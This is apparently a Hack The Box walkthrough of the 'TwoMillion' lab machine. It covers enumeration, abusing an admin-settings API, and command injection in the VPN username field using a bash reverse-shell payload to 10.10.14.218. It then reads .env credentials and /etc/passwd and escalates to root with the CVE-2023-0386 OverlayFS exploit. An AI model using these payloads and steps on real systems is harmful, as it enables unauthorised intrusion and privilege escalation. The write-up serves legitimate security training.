<h2>Target: 10.10.11.221  TwoMillion</h2>
<b>Initial Access:</b><br>
Step 1: nmap -Pn 10.10.11.221 -p 22,80 --min-rate=5000 |grep open|awk  -F '/' '{print $1}'| tr '\n' ',' <br>
Nmap returns open ports 22,80 <br><br>

Step 2: Enumerate these open ports further with nmap: nmap -Pn 10.10.11.221 -p 22,80 --min-rate=5000 -sC -sV -oN nmap-2million

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/d8ada3d7-f654-4b83-a718-5b2fc7a98969)
 
Nmap shows a redirect to http://2million.htb.  To enable this redirect, enter into the file /etc/hosts: 10.10.11.221  2million.htb

Step 4: Now that the redirect will work, run nmap again: nmap -Pn 10.10.11.221 -p 22,80 --min-rate=5000 -sC -sV -oN nmap-2million

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/9c8e8533-4af5-47e4-81f3-7fa9280848a9)

Step 5: Navigating to port 80 shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6ae0c5fc-b635-4d7e-a083-a6239d449541) 

Scrolling through the page we find a directory of /invite. Navigating to the page http://2million.htb/invite shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0eb9459e-cb46-498c-ae6b-73d78a3a11ae)
 
We need to get an ‘Invite Code’ in order to sign up. 

Step 6: Reviewing the source code to http://2million.htb/invite shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6a098ed3-ba93-419e-9dc6-11a41fd63d3e)
  
Inviteapi.min.js seems interesting.  Navigating to http://2million.htb/js/inviteapi.min.js shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/4d3dd1a8-87f6-4b23-bcfa-3ecf1a7b20db)
 
Step 7: This javascript code is a bit hard to read.  Open a javascript beautifier to make it easier to understand the code:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e20c68f1-51b9-4427-be89-cffc870011cf)
  
This shows a POST request for a url of http://2million.htb/api/v1/invite/how/to/generate.  Using burp suite issue this request:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e5efc738-5fed-4480-af4a-777087418468)
 
The response shows an encrypted message using ROT13.  

Step 8: Go to cyberchef to decrypt the message.  Copy the encrypted message and paste it into cyberchef:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6bb48889-424d-46b5-80ad-3f1e0fc116eb)
   
The decrypted message shows a POST request for /api/v1/invite/generate.  

Step 9: Using burpsuite, issue the POST request /api/v1/invite/generate: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/ea6a1498-7b66-4f71-a96f-0b53a5d4b41a)
 
The response shows a base64 encoded generated code.  Decode the code using burpsuite by highlighting the code: 4T8L8-FVZPK-5S1F4-MX7QD

Step 10: Enter the decoded code into the /invite page: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/59852658-d7a1-42d1-a5ae-ae91eb16945f)
 
Register a user and login.  After logging in the page shows:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/21465cb0-0eff-45c7-8976-3248f0297574)
  
Step 11: Using burpsuite, issue a GET request for /api/v1:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/b00fb8a9-3e89-409d-9aeb-a2ad7326f446)
 
The response reveals different directories and requests we can make.  

Step 12: Using burpsuite, issue the PUT request to /api/v1/admin/settings/update:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/461eb142-2402-4bea-a146-739ba1924bc1)

The response indicates we need an email.  Enter our username email we created when we registered an account (I used test@a.com):

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/e8474684-33a8-440d-857d-5831952316d1)

The response indicates we need to add the parameter is_admin:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0ac15205-9a9c-4346-aee1-f0f099ac71f9)

The response tells us that we need to add a 0 or 1 for the is_admin value (0 means the user is not an admin, 1 means the user is an admin):

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/3ce2d7e6-206d-45e8-9b12-7a0451b9899d)

It worked.  We have elevated our user to an admin privileged account.  

Step 13: Now that our user has admin privileges, let’s try to navigate to another one of the found directories in /api/v1 (see step 11).  Issue a POST request to /api/v1/admin/vpn/generate:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/cbd3465a-9176-46cc-bbed-e3c90c7a0df1)

The response shows that this request generates a vpn.  Check if we can get command injection to get a reverse shell using this request.  First, open a netcat listener to catch the reverse shell:  nc -lvnp 443

Next, add to the ‘username’ value the following: $(bash -c 'bash -i >& /dev/tcp/10.10.14.218/443 0>&1')

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/5633aa52-d3ca-4036-880a-394e734780c8)
 
We get a shell on our netcat listener as user www-data.
_______________________________________________
<b>Lateral Movement:</b><br>
Step 1: Read the file /var/www/html/.env: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/f097ab38-c5e2-41c8-a328-6771f32fc53f)
  
The file .env shows a username ‘admin’ and password ‘SuperDuperPass123’ .

Step 2: Check what users are on the target shell: cat /etc/passwd |grep sh

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6b5a21c1-d87c-4d44-9ba1-f9a3d54b8f9e)
 
The file /etc/passwd shows there’s a username on the target shell called ‘admin’.  

Step 3: Change to user admin: su admin → enter the password when prompted

We have shell as user admin.  We can get the flag in /home/admin/user.txt.
___________________________________
<b>Privilege Escalation:</b><br>
Step 1: Read the file /var/mail/admin: 

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/4da34dfb-77e0-4767-93db-fbf30de4dbd4)
  
The message indicates that the target is probably vulnerable to OverlayFS.  

Step 2: There are mulitple OverlayFS exploits.  To figure out which exploit will work for our target we will check the target system information: uname -a

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/0a57f978-3707-4854-b708-f3adc00fa2c2)

The response to ‘uname -a’ command shows that the target is running on 2022.

Step 3: Google search ‘overlayfs 2022 exploit’.  The results show plenty of articles on this.  We will choose https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386.  This page has a proof of concept linking to a github page:

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/8e33e738-5765-47cf-b5ca-56cfa6af59dd)
 
Step 3: Download the github page: git clone https://github.com/xkaneiki/CVE-2023-0386/

Upload ‘CVE-2023-0386’ to the target.  

Step 4: Following the proof of concept instructions, on the target shell in the ‘CVE-2023-0386’ directory, run the command: make

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/4003d230-27fd-4b71-80a9-469e2ac27d3e)

Step 5: On the target shell in the ‘CVE-2023-0386’ directory, run the command: ./fuse ./ovlcap/lower ./gc

Step 6: Open a 2nd target shell as user admin: ssh admin@2million.htb → enter the password when prompted.

In this 2nd target shell as user admin, go to the directory ‘CVE-2023-0386’ and run the command: ./exp

![image](https://github.com/AdamRose1/HackTheBox-Writeups/assets/93153300/6618e39f-6b60-457e-8b8e-b0e914638fe5)

We have shell as root.  We can get the flag in /root/root.txt
